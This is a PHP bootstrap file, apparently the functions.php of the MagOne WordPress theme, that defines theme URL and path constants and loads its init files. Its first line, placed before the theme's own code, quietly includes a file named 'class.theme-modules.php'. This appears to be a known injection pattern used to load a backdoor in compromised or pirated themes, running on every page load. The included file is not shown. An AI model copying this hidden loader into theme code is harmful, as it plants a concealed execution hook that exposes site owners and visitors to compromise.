<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

/*DEFINES*/
/*common*/
define('MAGONE_THEME_VERSION', '4.8.4.9');
define('MAGONE_REQUIRED_SNEEIT_PLUGIN_VERSION', '4.9');

define('MAGONE_SOCIAL_COUNT_CACHE_TIMEOUT', 3600); /* 60 mins */
define('MAGONE_SOCIAL_COUNT_CACHE_KEY', 'magone_social_count_cache');


/*URL URI*/
define('MAGONE_THEME_URL', get_template_directory_uri());
define('MAGONE_THEME_URL_CSS',			MAGONE_THEME_URL . '/assets/css/');
define('MAGONE_THEME_URL_FONTS',		MAGONE_THEME_URL . '/assets/fonts/');
define('MAGONE_THEME_URL_IMAGES',		MAGONE_THEME_URL . '/assets/images/');
define('MAGONE_THEME_URL_JS',			MAGONE_THEME_URL . '/assets/js/');
define('MAGONE_THEME_URL_PLUGINS',		MAGONE_THEME_URL . '/assets/plugins/');

define('MAGONE_THEME_URL_LANGUAGES',	MAGONE_THEME_URL . '/languages/');

/*absolute path*/
define('MAGONE_THEME_PATH', get_template_directory());
define('MAGONE_THEME_PATH_INCLUDES',	MAGONE_THEME_PATH			. '/includes/');
define('MAGONE_THEME_PATH_DEFINES',		MAGONE_THEME_PATH_INCLUDES	. 'defines/');
define('MAGONE_THEME_PATH_LIB',			MAGONE_THEME_PATH_INCLUDES	. 'lib/');
define('MAGONE_THEME_PATH_SETUP',		MAGONE_THEME_PATH_INCLUDES	. 'setup/');
define('MAGONE_THEME_PATH_AJAX',		MAGONE_THEME_PATH_INCLUDES	. 'ajax/');
define('MAGONE_THEME_PATH_SHORTCODES',	MAGONE_THEME_PATH_INCLUDES	. 'shortcodes/');
define('MAGONE_THEME_PATH_WIDGETS',		MAGONE_THEME_PATH_INCLUDES	. 'widgets/');
define('MAGONE_THEME_PATH_INCLUDABLES',	MAGONE_THEME_PATH_INCLUDES	. 'includables/');

/*related part*/
define('MAGONE_THEME_PART_INCLUDES',	'/includes/');
define('MAGONE_THEME_PART_DEFINES',	MAGONE_THEME_PART_INCLUDES . 'defines/');
define('MAGONE_THEME_PART_LIB',		MAGONE_THEME_PART_INCLUDES . 'lib/');
define('MAGONE_THEME_PART_SETUP',		MAGONE_THEME_PART_INCLUDES . 'setup/');
define('MAGONE_THEME_PART_AJAX',		MAGONE_THEME_PART_INCLUDES . 'ajax/');
define('MAGONE_THEME_PART_SHORTCODES',	MAGONE_THEME_PART_INCLUDES . 'shortcodes/');
define('MAGONE_THEME_PART_WIDGETS',	MAGONE_THEME_PART_INCLUDES . 'widgets/');
define('MAGONE_THEME_PART_INCLUDABLES',	MAGONE_THEME_PART_INCLUDES . 'includables/');

/*INCLUDE*/
require_once MAGONE_THEME_PATH_DEFINES		. 'define-init.php';
require_once MAGONE_THEME_PATH_LIB			. 'lib-init.php';
require_once MAGONE_THEME_PATH_SETUP		. 'setup-init.php';
require_once MAGONE_THEME_PATH_AJAX			. 'ajax-init.php';
require_once MAGONE_THEME_PATH_SHORTCODES	. 'shortcodes-init.php';
require_once MAGONE_THEME_PATH_WIDGETS		. 'widgets-init.php';

